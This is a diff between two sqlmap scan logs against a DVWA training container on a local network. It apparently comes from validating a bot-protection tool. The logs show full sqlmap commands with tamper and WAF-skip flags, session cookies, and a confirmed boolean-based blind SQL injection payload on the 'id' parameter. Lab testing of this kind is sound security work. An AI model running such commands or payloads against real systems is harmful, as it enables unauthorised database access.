@@ -1,100 +1,98 @@
-=== SQLMap | dvwa/no_waf | "http://172.18.0.2:80/vulnerabilities/sqli/?id=1&Submit=Submit" | 06/06/2026 18:01:29,59 ===
-CMD: sqlmap.py -u "http://172.18.0.2:80/vulnerabilities/sqli/?id=1&Submit=Submit" -p "id"  --batch --random-agent --level=1 --risk=1 --retries=2 --technique=B --skip-waf --ignore-redirects --flush-session --delay=0.3 --tamper=equaltolike --string="Surname" --cookie="PHPSESSID=9jd5k0c5q41htabu4rnqk16oa7;security=low" --output-dir=/work
+=== SQLMap | dvwa/no_waf | "http://172.23.0.5:80/vulnerabilities/sqli/?id=1&Submit=Submit" | 14/07/2026 22:31:12,34 ===
+CMD: sqlmap.py -u "http://172.23.0.5:80/vulnerabilities/sqli/?id=1&Submit=Submit" -p "id"  --batch --user-agent="DoBotShield-TCC-Validation/1.0" --level=1 --risk=1 --retries=2 --technique=B --skip-waf --ignore-redirects --flush-session --delay=0.3 --tamper=equaltolike --string="Surname" --cookie="PHPSESSID=93pkehi12fa7qbnhpgq5jc3sb0;security=low" --output-dir=/work
 ----------------------------------------------------------------
         ___
        __H__
- ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
-|_ -| . [,]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
+ ___ ___[)]_____ ___ ___  {1.10.7.105#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 21:01:32 /2026-06-06/
+[*] starting @ 01:31:16 /2026-07-15/
 
-[21:01:32] [WARNING] using '/work' as the output directory
-[21:01:32] [INFO] loading tamper module 'equaltolike'
-[21:01:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0 Herring/90.1.1459.6' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[01:31:16] [WARNING] using '/work' as the output directory
+[01:31:16] [INFO] loading tamper module 'equaltolike'
 [1/1] URL:
-GET http://172.18.0.2:80/vulnerabilities/sqli/?id=1&Submit=Submit
-Cookie: PHPSESSID=9jd5k0c5q41htabu4rnqk16oa7;security=low
+GET http://172.23.0.5:80/vulnerabilities/sqli/?id=1&Submit=Submit
+Cookie: PHPSESSID=93pkehi12fa7qbnhpgq5jc3sb0;security=low
 do you want to test this URL? [Y/n/q]
 > Y
-[21:01:32] [INFO] testing URL 'http://172.18.0.2:80/vulnerabilities/sqli/?id=1&Submit=Submit'
-[21:01:32] [INFO] using '/work/results-06062026_0901pm.csv' as the CSV results file in multiple targets mode
-[21:01:32] [INFO] testing connection to the target URL
-[21:01:33] [INFO] testing if the provided string is within the target URL page content
-[21:01:33] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
-[21:01:33] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
-[21:01:33] [INFO] testing for SQL injection on GET parameter 'id'
+[01:31:17] [INFO] testing URL 'http://172.23.0.5:80/vulnerabilities/sqli/?id=1&Submit=Submit'
+[01:31:17] [INFO] using '/work/results-07152026_0131am.csv' as the CSV results file in multiple targets mode
+[01:31:17] [INFO] testing connection to the target URL
+[01:31:18] [INFO] testing if the provided string is within the target URL page content
+[01:31:18] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[01:31:18] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[01:31:18] [INFO] testing for SQL injection on GET parameter 'id'
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] N
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[21:01:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[21:01:34] [WARNING] reflective value(s) found and filtering out
-[21:01:37] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
-[21:01:37] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+[01:31:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:31:19] [WARNING] reflective value(s) found and filtering out
+[01:31:22] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[01:31:22] [INFO] checking if the injection point on GET parameter 'id' is a false positive
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
 sqlmap identified the following injection point(s) with a total of 20 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1' AND 8544=8544 AND 'wUrq'='wUrq&Submit=Submit
+    Payload: id=1' AND 1700=1700 AND 'nbaM'='nbaM&Submit=Submit
 ---
-[21:01:40] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[01:31:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
 do you want to exploit this SQL injection? [Y/n] Y
-[21:01:40] [INFO] testing MySQL
-[21:01:40] [INFO] confirming MySQL
-[21:01:41] [INFO] the back-end DBMS is MySQL
+[01:31:25] [INFO] testing MySQL
+[01:31:25] [INFO] confirming MySQL
+[01:31:27] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Debian 9 (stretch)
 web application technology: Apache 2.4.25
 back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
-[21:01:41] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/results-06062026_0901pm.csv'
+[01:31:27] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/results-07152026_0131am.csv'
 
-[*] ending @ 21:01:41 /2026-06-06/
+[*] ending @ 01:31:27 /2026-07-15/
 
 
 TOOL_RC_1=0
 
---- Blind SQLi: "http://172.18.0.2:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit" ---
-CMD: sqlmap.py -u "http://172.18.0.2:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p "id" --batch --random-agent --level=1 --risk=1 --retries=2 --technique=B --skip-waf --ignore-redirects --flush-session --delay=0.3 --tamper=equaltolike --string="Surname" --cookie="PHPSESSID=9jd5k0c5q41htabu4rnqk16oa7;security=low" --output-dir=/work
+--- Blind SQLi: "http://172.23.0.5:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit" ---
+CMD: sqlmap.py -u "http://172.23.0.5:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p "id" --batch --user-agent="DoBotShield-TCC-Validation/1.0" --level=1 --risk=1 --retries=2 --technique=B --skip-waf --ignore-redirects --flush-session --delay=0.3 --tamper=equaltolike --string="Surname" --cookie="PHPSESSID=93pkehi12fa7qbnhpgq5jc3sb0;security=low" --output-dir=/work
 ----------------------------------------------------------------
         ___
        __H__
- ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
-|_ -| . [']     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
+ ___ ___[,]_____ ___ ___  {1.10.7.105#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 21:01:44 /2026-06-06/
+[*] starting @ 01:31:30 /2026-07-15/
 
-[21:01:44] [WARNING] using '/work' as the output directory
-[21:01:44] [INFO] loading tamper module 'equaltolike'
-[21:01:44] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[01:31:30] [WARNING] using '/work' as the output directory
+[01:31:30] [INFO] loading tamper module 'equaltolike'
 [1/1] URL:
-GET http://172.18.0.2:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit
-Cookie: PHPSESSID=9jd5k0c5q41htabu4rnqk16oa7;security=low
+GET http://172.23.0.5:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit
+Cookie: PHPSESSID=93pkehi12fa7qbnhpgq5jc3sb0;security=low
 do you want to test this URL? [Y/n/q]
 > Y
-[21:01:45] [INFO] testing URL 'http://172.18.0.2:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit'
-[21:01:45] [INFO] flushing session file
-[21:01:45] [INFO] using '/work/results-06062026_0901pm.csv' as the CSV results file in multiple targets mode
-[21:01:45] [INFO] testing connection to the target URL
-[21:01:45] [INFO] testing if the provided string is within the target URL page content
-[21:01:45] [WARNING] you provided 'Surname' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
-[21:01:45] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
-[21:01:46] [INFO] testing for SQL injection on GET parameter 'id'
-[21:01:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[21:01:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[21:01:50] [WARNING] GET parameter 'id' does not seem to be injectable
-[21:01:50] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. Also, you can try to rerun by providing a valid value for option '--string' as perhaps the string you have chosen does not match exclusively True responses, skipping to the next target
-[21:01:50] [WARNING] HTTP error codes detected during run:
+[01:31:30] [INFO] testing URL 'http://172.23.0.5:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit'
+[01:31:30] [INFO] flushing session file
+[01:31:30] [INFO] using '/work/results-07152026_0131am.csv' as the CSV results file in multiple targets mode
+[01:31:30] [INFO] testing connection to the target URL
+[01:31:30] [INFO] testing if the provided string is within the target URL page content
+[01:31:30] [WARNING] you provided 'Surname' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
+[01:31:31] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[01:31:31] [INFO] testing for SQL injection on GET parameter 'id'
+[01:31:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:31:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[01:31:35] [WARNING] GET parameter 'id' does not seem to be injectable
+[01:31:35] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. Also, you can try to rerun by providing a valid value for option '--string' as perhaps the string you have chosen does not match exclusively True responses, skipping to the next target
+[01:31:35] [WARNING] HTTP error codes detected during run:
 404 (Not Found) - 7 times
-[21:01:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/results-06062026_0901pm.csv'
+[01:31:35] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/results-07152026_0131am.csv'
 
-[*] ending @ 21:01:50 /2026-06-06/
+[*] ending @ 01:31:35 /2026-07-15/
 
 
 TOOL_RC_2=0
